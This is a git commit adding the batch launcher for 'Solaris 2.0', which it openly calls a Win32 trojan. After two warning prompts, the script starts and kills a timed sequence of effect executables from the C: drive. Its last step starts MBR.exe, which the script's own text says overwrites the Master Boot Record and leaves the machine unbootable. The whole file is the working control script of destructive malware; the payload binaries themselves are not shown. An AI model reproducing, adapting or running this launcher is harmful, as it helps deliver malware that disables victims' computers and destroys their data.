d85c49e645e862ae26e756eb8b82c3e19310bca6
pankoza-pl <77279607+pankoza-pl@users.noreply.github.com>
2021-12-28 13:27:53 +0100

    main launcher source (cringe warning)

---
+++ Solaris 2.0.bat
@@ -0,0 +1,117 @@
+@shift /0
+@echo off
+title "A Trail Of Sickness Leading To Me, If Im Haunted Then You'll See."
+echo What you have just executed is Solaris 2.0 a Trojan.Win32 made for "AlphaWolf's Programming Community" this software can make your machine unstable and unusable, it can overwrite your MBR (Master Boot Record) Which can make your machine unbootable, do you still want to execute it?
+pause
+title "Im Not Ready For Death, Or am i?"
+cls
+echo This is the final warning this software can harm your device, are you sure you want to execute this software?
+pause
+start C:\HITBMAP.exe
+PING localhost -n 10 >NUL
+start C:\AFirst.exe
+PING localhost -n 2 >NUL
+start C:\wave.exe
+PING localhost -n 3 >NUL
+start C:\FIRST.exe
+start C:\FIRST3.exe
+PING localhost -n 3 >NUL
+taskkill /f /im FIRST3.exe
+PING localhost -n 3 >NUL
+start C:\FIRST3.exe
+PING localhost -n 3 >NUL
+taskkill /f /im FIRST.exe
+PING localhost -n 3 >NUL
+start C:\FIRST.exe
+PING localhost -n 3 >NUL
+taskkill /f /im FIRST3.exe
+taskkill /f /im FIRST.exe
+PING localhost -n 3 >NUL
+start C:\FIRST3.exe
+PING localhost -n 3 >NUL
+taskkill /f /im FIRST3.exe
+taskkill /f /im FIRST.exe
+PING localhost -n 3 >NUL
+start C:\FIRST3.exe
+start C:\FIRST.exe
+PING localhost -n 3 >NUL
+taskkill /f /im HITBMAP.exe
+taskkill /f /im AFirst.exe
+taskkill /f /im FIRST.exe
+taskkill /f /im FIRST3.exe
+taskkill /f /im wave.exe
+start C:\ATohou.exe
+PING localhost -n 2 >NUL
+start C:\RGB2.exe
+start C:\Circle2.exe
+PING localhost -n 30 >NUL
+taskkill /f /im RGB2.exe
+taskkill /f /im Circle2.exe
+taskkill /f /im ATohou.exe
+start C:\AWave.exe
+start C:\wave.exe
+start C:\CircleR.exe
+PING localhost -n 30 >NUL
+taskkill /f /im CircleR.exe
+taskkill /f /im AWave.exe
+start C:\ARGB.exe
+start C:\Circle.exe
+start C:\wave.exe
+PING localhost -n 30 >NUL
+taskkill /f /im Circle.exe
+taskkill /f /im ARGB.exe
+taskkill /f /im wave.exe
+start C:\APurple.exe
+start C:\Purple.exe
+start C:\Shake.exe
+PING localhost -n 30 >NUL
+taskkill /f /im APurple.exe
+taskkill /f /im Purple.exe
+taskkill /f /im Shake.exe
+start C:\Whoa.exe
+start C:\Circle.exe
+start C:\AWhoa2.exe
+PING localhost -n 20 >NUL
+taskkill /f /im Circle.exe
+PING localhost -n 10 >NUL
+taskkill /f /im AWhoa2.exe
+start C:\AWhoa.exe
+PING localhost -n 2 >NUL
+start C:\\Squares.exe
+start C:\\Squares2.exe
+start C:\\Squares3.exe
+start C:\Rotate.exe
+start C:\LAST.exe
+start C:\FIRST3.exe
+PING localhost -n 99 >NUL
+taskkill /f /im FIRST3.exe
+taskkill /f /im AWhoa.exe
+taskkill /f /im Rotate.exe
+taskkill /f /im Whoa.exe
+taskkill /f /im LAST.exe
+taskkill /f /im Squares2.exe
+taskkill /f /im Squares3.exe
+taskkill /f /im Squares.exe
+start C:\ACube.exe
+start C:\RGB.exe
+PING localhost -n 10 >NUL
+start C:\Cubes.exe
+PING localhost -n 10 >NUL
+taskkill /f /im Cubes.exe
+taskkill /f /im RGB.exe
+taskkill /f /im ACube.exe
+start C:\ADun.exe
+PING localhost -n 2 >NUL
+start C:\Dun.exe
+start C:\Dun2.exe
+PING localhost -n 20 >NUL
+taskkill /f /im Dun.exe
+PING localhost -n 10 >NUL
+taskkill /f /im Dun2.exe
+start C:\ALast.exe
+PING localhost -n 2 >NUL
+start C:\LAST2.exe
+PING localhost -n 30 >NUL   
+start C:\MBR.exe
+taskkill /f /im LAST2.exe 
+taskkill /f /im ALast.exe                           
